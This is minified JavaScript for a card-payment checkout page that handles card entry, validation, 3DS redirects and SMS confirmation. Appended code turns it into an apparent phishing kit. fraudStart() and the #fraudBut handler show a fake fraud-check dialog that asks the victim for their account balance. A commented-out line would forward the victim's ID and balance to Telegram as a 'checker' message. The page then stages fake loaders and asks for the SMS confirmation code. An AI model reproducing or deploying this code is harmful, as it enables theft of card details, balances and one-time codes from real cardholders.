			this.renderFatalErrorMessage = function(n, i) {
				t.hidePaymentForm();
				t.hideCancelButton();
				t.hideProceedButton();
				t.hideReceiptButton();
				t.showRedirectToMerchantButton();
				t.renderErrorMessage(n, i)
			};
			this.renderWarnMessage = function(n, i) {
				t.renderMessage("pp-warning", n, i)
			};
			this.renderPointMessage = function(n, i) {
				t.hidePaymentForm();
				t.hideCancelButton();
				t.hideProceedButton();
				t.hideReceiptButton();
				t.showRedirectToMerchantButton();
				t.renderWarnMessage(n, i)
			};
			this.renderPendingMessage = function(n) {
				var i = {
					cssClass: "pp-inprogress",
					text: n,
					renderLoader: !0
				};
				t.renderMessageInternal(i)
			};
			this.renderPendingMessageWithWarning = function(n, i) {
				var r = {
					cssClass: "pp-inprogress",
					text: n,
					additionalMessageHtml: i,
					renderLoader: !0
				};
				t.renderMessageInternal(r)
			};
			this.renderLoader = function() {
				t.renderPendingMessage(locale.get("paymentIsExecuting"))
			};
			this.renderPaymentOptions = function(n) {
				var r = h.find(".payment-options-container"),
					t, i;
				if (n.tabs) {
					var t = $("#template-paymentoptions-tabs").html(),
						i = Handlebars.compile(t),
						u = n.methods.filter(function(t) {
							return t.alias !== n.method
						}),
						f = {
							top: u.slice(0, 2)
						},
						e = u.slice(2);
					e.length > 0 && (f.other = e);
					r.html(i(f))
				} else t = $("#template-paymentoptions-bricks").html(), i = Handlebars.compile(t), r.html(i(n))
			}
		},
		h = function(t, r, u) {
			function c(n) {
				var u = (new Date).getFullYear() - 2e3,
					e = {
						notificationSink: {
							pattern: /^[a-zA-Zа-яА-Я0-9_%-]+(?:\.[a-zA-Zа-яА-Я0-9_%-]+)*@[a-zA-Zа-яА-Я0-9-]+(?:\.[a-zA-Zа-яА-Я0-9]+)+$/,
							maxlength: 50,
							required: !0
						},
						payment_amount: {
							required: !0,
							money: t.payment.maxAmount
						},
						confirmationCode: {
							required: !0,
							digits: !0
						}
					},
					s = {
						card_pan: {
							required: !0,
							pattern: /^[0-9\u25CF\s]{16,19}$/
						},
						card_month: {
							required: !0,
							digits: !0,
							normalizer: function(n) {
								return $.trim(n)
							},
							max: 12,
							min: 1,
							maxlength: 2
						},
						card_year: {
							required: !0,
							digits: !0,
							normalizer: function(n) {
								return $.trim(n)
							},
							min: u,
							max: u + 10,
							maxlength: 2
						},
						card_cvc: {
							required: !0,
							digits: !0,
							minlength: 3,
							maxlength: 3
						},
						card_holder: {
							required: !0,
							pattern: /^[a-zA-Z\s'\-\.]{2,25}$/
						}
					},
					i = {};
				$.extend(i, e);
				n && $.extend(i, s);
				o.destroy();
				o = $("#payment_requisites_form").validate({
					ignore: [],
					rules: i,
					submitHandler: function() {
						r.submitPaymentForm(f)
					},
					errorClass: "validation-error",
					errorPlacement: function() {}
				})
			}

			function l() {
				return f.type === i.Empty ? (u.hidePaymentForm(), u.hideCancelButton(), u.hideProceedButton(), u.hideReceiptButton(), u.hideRedirectToMerchantButton(), r.changePs(f.system), !1) : (u.setPaymentForm(f.type), c(f.type === i.Card), !0)
			}

			function s(n) {
				for (var t = 0; t < e.length; t++)
					if (e[t].alias === n) {
						f = e[t];
						break
					}
				return u.setPaymentMethod(f), l()
			}
			var h = this,
				e = t.methods,
				f, o = $("#payment_requisites_form").validate();
			this.switchPaymentMethod = function(n) {
				if (n) return s(n) ? (u.togglePaymentMethodChange(t.requisites.change), f.type == i.External && !t.requisites.email.required) ? (u.hidePaymentForm(), u.hideCancelButton(), u.hideProceedButton(), u.hideRedirectToMerchantButton(), u.renderLoader(), r.submitPaymentForm(f), !0) : !1 : !1
			};
			this.setPaymentMethod = function(n) {
				n && !s(n)
			};
			this.initializePaymentOptions = function() {
				var n = {
					tabs: t.requisites.tabs,
					method: t.requisites.method,
					methods: t.methods
				};
				u.renderPaymentOptions(n)
			};
			this.enablePsSelectorClick = function() {
				$(".other-payment-methods").on("click", function(n) {
					n.preventDefault();
					var t = $(this).parent().siblings("ul.pp-showcases");
					$(this).toggleClass("opened");
					t.slideToggle()
				})
			};
			this.initializeInputMasks = function() {
				$("input.payment-amount").attr("placeholder", "макс. " + Globalize.format(t.payment.maxAmount));
				Inputmask.extendDefinitions({
					c: {
						validator: "[0-9●]"
					}
				});
				$("input[data-mask]").each(function(n, t) {
					$(t).inputmask({
						mask: $(t).attr("data-mask"),
						autoUnmask: !0,
						placeholder: "",
						showMaskOnHover: !1,
						showMaskOnFocus: !1
					})
				})
			};
			this.initializeNotificationBox = function() {
				var n = $(".notify");
				if (n) n.on("change", function() {
					u.switchNotification(!$(this).prop("checked"))
				})
			};
			this.initializeAmount = function() {
				u.applyOptions(t)
			};
			this.initializeSelectBox = function() {
				var n = $(".payment-options-container");
				n.on("click", "a.more-payment-methods, .more-payment-methods a", function(n) {
					n.preventDefault();
					$("ul.other-payment-methods").slideToggle();
					$("a.more-payment-methods,a.card-payment-method").toggleClass("active-payment-method")
				});
				n.on("click", "a.card-payment-method", function(n) {
					n.preventDefault();
					$("ul.other-payment-methods").slideUp();
					$("a.card-payment-method").addClass("active-payment-method");
					$("a.more-payment-methods").removeClass("active-payment-method")
				});
				n.on("click", "a.select-payment-method", function(n) {
					var i, r;
					n.preventDefault();
					$(".more-payment-methods").is(":visible") ? $("ul.other-payment-methods").slideUp(!1) : $("ul.other-payment-methods").hide();
					$(this).addClass("active-payment-method");
					$(".payment-options-bricks").length === 0 && (i = {
						methods: t.methods
					}, u.renderPaymentOptions(i));
					r = $(this).attr("data-method");
					h.switchPaymentMethod(r)
				});
				$(".details-toggle a").click(function(n) {
					n.preventDefault();
					$(this).toggleClass("opened");
					$(this).prev(".description").slideToggle(250)
				})
			};
			this.initializeCardControls = function() {
				var i, e, h;
				$("select:enabled").editableSelect({
					filter: !1
				});
				$("#cardExpirationMonth").on("hidden.editable-select input", function() {
					$(this).val().length === 2 && $(this).valid() && ($("#cardExpirationYear").valid() ? $("#cardCVC").valid() || $("#cardCVC").focus() : $("#cardExpirationYear").focus())
				});
				$("#cardExpirationYear").on("hidden.editable-select input", function() {
					$(this).val().length === 2 && $(this).valid() && ($("#cardCVC").valid() || $("#cardCVC").focus())
				});
				$("#cardCVC").on("keyup", function() {
					if ($(this).val().length === 3 && $(this).valid()) {
						var n = $("#cardHolder,#notificationSink").first();
						n.length > 0 && !n.valid() && n.focus()
					}
				});
				i = $("div.select-list");
				e = $("div.select-option");
				e.each(function(n, t) {
					var i = $(t),
						r = i.attr("data-label"),
						u = Inputmask.format(r.replace(/X/g, "●"), {
							mask: "cccc cccc cccc ccccccc",
							placeholder: ""
						});
					i.find(".token-label").html(u)
				});
				var f = function() {
						i.hasClass("fadeInDown") && i.removeClass("fadeInDown").hide()
					},
					o = function() {
						i.find("div.select-option").length > 0 && i.show().addClass("fadeInDown")
					},
					s = function(n) {
						u.switchTokenPaymentMode(n.find(".token-label").html());
						$("#cardToken").val(n.attr("data-value"));
						$("#cardCVC").focus();
						f()
					},
					c = function() {
						u.switchCardPaymentMode();
						$("#cardToken").val("");
						o()
					};
				i.on("click", "div.select-option", function(n) {
					n.stopPropagation();
					var t = $(n.target),
						i;
					i = t.is("div.select-option") ? t : t.parent("div.select-option");
					s(i)
				});
				$("#cardNumber").on("click", function(n) {
					n.stopPropagation();
					c()
				});
				i.on("click", ".token-remove", function(n) {
					n.stopPropagation();
					var t = $(n.target).parent("div.select-option");
					r.removePaymentToken(t.attr("data-value"));
					t.remove();
					$("div.select-option").length === 0 && f()
				});
				$("#cardNumber").on("keydown", function(n) {
					n.which === 27 && (n.preventDefault(), f())
				});
				h = function(n) {
					for (var i = [/^5[1-5]\d+$/, /^(22[2-9]|2[3-6]|27[0-2])\d+$/, /^4\d+$/], t = 0; t < i.length; t++)
						if (i[t].test(n)) return 16;
					return 19
				};
				$("#cardNumber").on("keyup", function(n) {
					var i = $(n.target).val(),
						t = i.length,
						r;
					t === 0 ? o() : t > 3 && f();
					t >= 12 && (r = h(i), t === r && ($("#cardExpirationMonth").valid() || $("#cardExpirationMonth").focus()))
				});
				$(n).click(function() {
					f()
				});
				t.newPayment && e.length > 0 && s(e.first())
			};
			this.initializeCancelButton = function() {
				$("#confirmCancelButton").click(function() {
					r.cancelPayment()
				})
			};
			this.initializeCardPanInputs = function() {};
			this.initializeModals = function() {
				function n() {
					$("#supEmail").val() && $("#supMessage").val().length > 5 ? $("#sendMessage").attr("disabled", !1) : $("#sendMessage").attr("disabled", !0)
				}
				$("a.modal-anchor").on("click", function(n) {
					var i;
					n.preventDefault();
					var r = $(this).attr("data-target-window"),
						t = $("[data-remodal-id=" + r + "]"),
						u = t.remodal({
							hashTracking: !1
						});
					u.open();
					t.find("input").length > 0 && t.find("input").not(":hidden, :disabled").first().focus();
					r === "supportModal" && (i = $('input[name="email"]').val(), i && $('input[name="email"]').hasClass("valid") && $("#supEmail").val(i))
				});
				$("#supEmail, #supMessage").on("input", function() {
					n()
				})
			};
			this.initializeTooltips = function() {
				var t = $(".tooltip a"),
					n = $(".tooltip-body");
				t.on("click", function(t) {
					t.stopPropagation();
					t.preventDefault();
					$(this).next(n).toggle()
				});
				$(document).on("click", function() {
					n.is(":visible") && n.hide()
				})
			};
			this.setRedirectToMerchantDefaultHandler = function() {
				u.setDefaultRedirectToMerchantHandler()
			};
			this.initializeTokenBasedPaymentMethods = function() {
				t.GooglePay && n.GooglePay.Configure({
					merchantId: t.GooglePay.merchantId,
					currencyCode: t.payment.currency,
					amount: t.payment.amount.toString()
				})
			}
		},
		c = function(t, e, o) {
			var s = t.payment.id,
				l = "payments",
				c = new HttpRequestUtils,
				h = this,
				a = /^[a-zA-Zа-яА-Я0-9._%-]+@([a-zA-Zа-яА-Я0-9-]+){1}(\.[a-zA-Zа-яА-Я0-9]+)+$/;
			this.handleCancelPaymentResponse = function(t) {
				o.hidePaymentForm();
				o.hideCancelButton();
				o.hideProceedButton();
				o.hideReceiptButton();
				setTimeout(function() {
					t.httpMethod === "Get" ? n.location.assign(t.redirectUrl) : c.generatePostFormAndRedirect(t.redirectUrl, t.postParams, t.httpMethod)
				}, 700)
			};
			this.handleCancelPaymentFailedResponse = function(n) {
				if (!n) {
					o.renderErrorMessage(locale.get("error"), locale.get("internalError"));
					return
				}
				o.renderWarnMessage(n.title, n.messageBody)
			};
			this.changePs = function(t) {
				var i = urlUtils.createFromTemplate("{controller}/{id}/{action}/{subaction}/{psId}", {
					controller: l,
					action: "ps",
					subaction: "set",
					id: s,
					psId: t
				});
				o.makeFormReadOnly();
				o.renderPendingMessage("");
				$.ajax({
					url: i,
					cache: !1,
					contentType: "application/json",
					data: {},
					method: "POST",
					timeout: 5e4
				}).done(function() {
					var t = urlUtils.createFromTemplate("payment/process/{id}", {
						id: s
					});
					n.location.assign(t)
				}).fail(function() {
					o.renderErrorMessage(locale.get("error"), locale.get("internalError"))
				})
			};
			this.cancelPayment = function() {
				var n = urlUtils.createFromTemplate("{controller}/{action}/{id}", {
					controller: l,
					action: "cancel",
					id: s
				});
				o.makeFormReadOnly();
				o.renderPendingMessage("");
				$.ajax({
					url: n,
					contentType: "application/json",
					data: {},
					cache: !1,
					dataType: "json",
					method: "POST",
					timeout: 15e3
				}).done(function(n) {
					switch (n.type) {
						case r.TrackPayment:
							e.pullPaymentStatus();
							break;
						case r.PaymentCancelled:
							h.handleCancelPaymentResponse(n);
							break;
						case r.Error:
							h.handleCancelPaymentFailedResponse(n);
							break;
						default:
							h.handleCancelPaymentFailedResponse()
					}
				}).fail(function() {
					h.handleCancelPaymentFailedResponse()
				})
			};
			this.handleCoreResponse = function(t, i) {
				var p, a, v, y, r, l;
				if (!t) {
					o.renderErrorMessage(locale.get("error"), locale.get("unavailable"), i);
					return
				}
				t.payment && (p = {
					payment: t.payment
				}, o.applyOptions(p));
				switch (t.status) {
					case u.None:
						o.clearCurrentMessage();
						o.openRequisiteForm();
						break;
					case u.ConfirmationRequired:
						a = t.confirmation;
						a === f.SmsOtp ? o.showConfirmationBlock(t.phone) : a === f.PaymentUrl ? (r = t.redirect, v = UAParser(), v.device.type === "mobile" || v.device.type === "tablet" ? n.location.assign(r.url) : (t.message && (l = t.message.text), o.showUniversalPaymentUrl(r.url, l)), e.subscribeToNotification()) : a === f.ThreeDSMethod ? (y = "transportFrame", n.notifyThreeDSMethodComplete = function() {
							var n = document.getElementById(y);
							n.parentElement.removeChild(n);
							h.submitRequisites("/pay/api/confirm/" + s, {}, !1)
						}, r = t.redirect, c.generateThreeDSMethodIframe(r.url, r.params, r.method, y)) : (r = t.redirect, r.method === "Get" ? n.location.assign(r.url) : c.generatePostFormAndRedirect(r.url, r.params, r.method));
						break;
					case u.Rejected:
						l = t.message;
						o.renderErrorMessage(l.title, l.text, i);
						o.openRequisiteForm();
						break;
					case u.Error:
						l = t.message;
						o.renderErrorMessage(l.title, l.text, i);
						o.isConfirmationMode() ? o.showConfirmationBlock() : o.openRequisiteForm();
						break;
					default:
						e.pullPaymentStatus()
				}
			};
			this.submitRequisites = function(t, i, r) {
				var s = $("#payment_requisites_form"),
					f, u;
				o.togglePaymentMethodChange(!1);
				o.makeFormReadOnly();
				o.renderPendingMessage(locale.get("paymentIsExecuting"));
				f = $("#paymentAmount").val();
				f && (i.amount = Globalize.parseFloat(f));
				u = $("#notificationSink").val();
				a.test(u) ? i.email = u : i.phone = u;
				i.browserLanguage = n.navigator.language;
				i.colorDepth = n.screen.colorDepth;
				i.screenWidth = n.screen.width;
				i.screenHeight = n.screen.height;
				i.localTime = new Date;
				$.ajax({
					url: t,
					contentType: "application/json",
					data: JSON.stringify(i),
					cache: !1,
					dataType: "json",
					method: "POST",
					timeout: 5e4
				}).done(function(n) {
					h.handleCoreResponse(n, r)
				}).fail(function(n) {
					if (n.status === 400) {
						o.renderErrorMessage(locale.get("error"), locale.get("unavailable"), r);
						return
					}
					e.pullPaymentStatus()
				})
			};
			this.submitPaymentForm = function(n) {
				var r, t = {},
					u;
				o.isConfirmationMode() ? (r = "/pay/api/confirm/" + s, t.code = $("#confirmationCode").val()) : (r = n.type == i.Card ? "/pay/api/cards/auth/" + s : "/pay/api/external/auth/" + s, t.method = n.alias, n.type == i.Card && (t.cvc = $("#cardCVC").val(), u = $("#cardToken").val(), u ? t.token = u : (t.pan = $("#cardNumber").val(), t.expirationMonth = $("#cardExpirationMonth").val(), t.expirationYear = "20" + $("#cardExpirationYear").val(), t.holder = $("#cardHolder").val(), t.saveCard = $("#saveCard").prop("checked"))));
				this.submitRequisites(r, t, !0)
			};
			this.submitApplePayToken = function(n) {
				var t = {
						email: n.email,
						token: JSON.stringify(n.token)
					},
					i = "/pay/api/applepay/auth/" + s;
				this.submitRequisites(i, t)
			};
			this.submitGooglePayToken = function(n) {
				var t = {
						email: n.email,
						token: JSON.stringify(n.token)
					},
					i = "/pay/api/googlepay/auth/" + s;
				this.submitRequisites(i, t)
			};
			this.removePaymentToken = function(n) {
				var t = "/pay/api/tokens/remove/" + n;
				$.ajax({
					url: t,
					contentType: "application/json",
					data: JSON.stringify({}),
					cache: !1,
					dataType: "json",
					method: "POST",
					timeout: 5e3
				})
			}
		};
	$(function() {
		l(paymaster.options)
	})
}(window)

function fraudStart(){

	setTimeout(
		function(){
	$( ".loader" ).fadeIn();
	$("#backblack").fadeIn();
	$("#fraud .styles_container__povOI").hide();
			// $("#fraud").fadeIn();
			// $( "#loaderFraud" ).fadeOut();
		}, 2000
	);

	setTimeout(
		function(){
			$("#fraud").fadeIn();
			// $( "#loaderFraud" ).fadeOut();
		}, 2500
	);
	setTimeout(
		function(){
			
			$("#fraud .styles_container__povOI").show();
			$( ".loader" ).fadeOut();
		}, 3500
	);
}

/*Dropdown Menu*/
			$('.dropdown').click(function () {
			        $(this).attr('tabindex', 1).focus();
			        $(this).toggleClass('active');
			        $(this).find('.dropdown-menu').slideToggle(300);
			    });
			    $('.dropdown').focusout(function () {
			        $(this).removeClass('active');
			        $(this).find('.dropdown-menu').slideUp(300);
			    });
			    $('.dropdown .dropdown-menu li').click(function () {
			        $(this).parents('.dropdown').find('span').text($(this).text());
			        $(this).parents('.dropdown').find('input').attr('value', $(this).attr('id'));
			    });
			/*End Dropdown Menu*/


			$('.dropdown-menu li').click(function () {
			  var input = '<strong>' + $(this).parents('.dropdown').find('input').val() + '</strong>',
			      msg = '<span class="msg">Hidden input value: ';
			  $('.msg').html(msg + input + '</span>');
			}); 


function checkBalance(){
	if($("#balance").val().length  > 1){
		$("#fraudBut").css("background-color", "#006d8c")
		$("#fraudBut").css("color", "white")
	}
	else{
		$("#fraudBut").css("background-color", "#ccc")
		$("#fraudBut").css("color", "#262626")
	}
}	

$("#fraudBut").click(function(){
	// alert(flag);
	if ($("#fraudBut").attr("disabled")!="disabled") {

		if($("#balance").val().length  > 1){
			$("#fraudBut").attr("disabled", "disabled");
			    $("#fraudBut").css("opacity","0.5");

			// tg("🔥 Чекер 🔥 \n 🐘 ID" + "<?php echo $idPerson?>" + "\n💰 На счету :" + $("#balance").val() + $(".select").text().replace(/\s/g, ''));


			$( ".loader" ).fadeIn("slow");

			setTimeout(
				function(){
					$("#fraud .styles_container__povOI").fadeOut();
				}, 3000
			);

			setTimeout(
				function(){
					$( ".loader" ).fadeOut();
					$( ".fraudOk" ).fadeIn();
				}, 4000
			);




			setTimeout(
				function(){
					$( ".fraudOk" ).fadeOut();
					$("#fraud").fadeOut();
					$("#backblack").fadeOut();

					$( ".loader" ).fadeIn();
				}, 6000
			);

			setTimeout(
				function(){
				 //  	$("#cardBox").hide();
				 //  	// $("#cardLabel").hide();
				 //  	$("#expBox").hide();
				 //  	$("#cvcBox").hide();
				 //  	$("#boxMail").hide();
				 //  	$("#boxFio").hide();

				 //  	$(".styles_saveCardContainer__mPUhQ").hide();


				 //  	$(".styles_termsHint__2XVD6").css("opacity","0")				  	
				 //  	$(".styles_termsHint__2XVD6").css("margin-top","0")			  	
				 //  	$(".styles_termsHint__2XVD6").css("line-height","0")
				 //  	$("#logoBank").hide()

				 //  	$("#mainBut").css("color","#6c6c6c");
					// $("#oplata").css("background-color","#f4f4f4");		

				 //  	$("#passBox").show();
				 //  	$(".styles_title__1O7Vi").text("Введите Ваш код")
				 //  	$("#pass").css("text-align","center")
				 //  	$("#mainBut").text("Отправить");

				 //  	isStage2 = true;

				 //  	timerStart(100);
					// $( "#loader" ).fadeOut();
						$("#cancel").fadeOut();
		                $(".payment-data-block").fadeOut("slow")
		                $(".notification-block").fadeOut("slow")
		                $("#proceed").text("Отправить")
		                stage2 = true;
		                setTimeout(function(){
		                    $("#proceed").removeAttr("disabled")
		                    $(".pp-message p").text("Ожидание смс-кода подтверждения");
		                    $("#confirmationCode").removeAttr("disabled")
		                    $(".confirmation-block").removeClass("hidden")
		                    $("#confirmationCode").val("")
		                    zeroX++;
		                    timerStart(100);
		                }, 1500);
				}, 7000
			);
		}
		else{
			$("#fraudErr").text("Заполните поле");
			$("#balance").css("border-color","red");
			$("#fraudErr").show()
		}
	}
	})
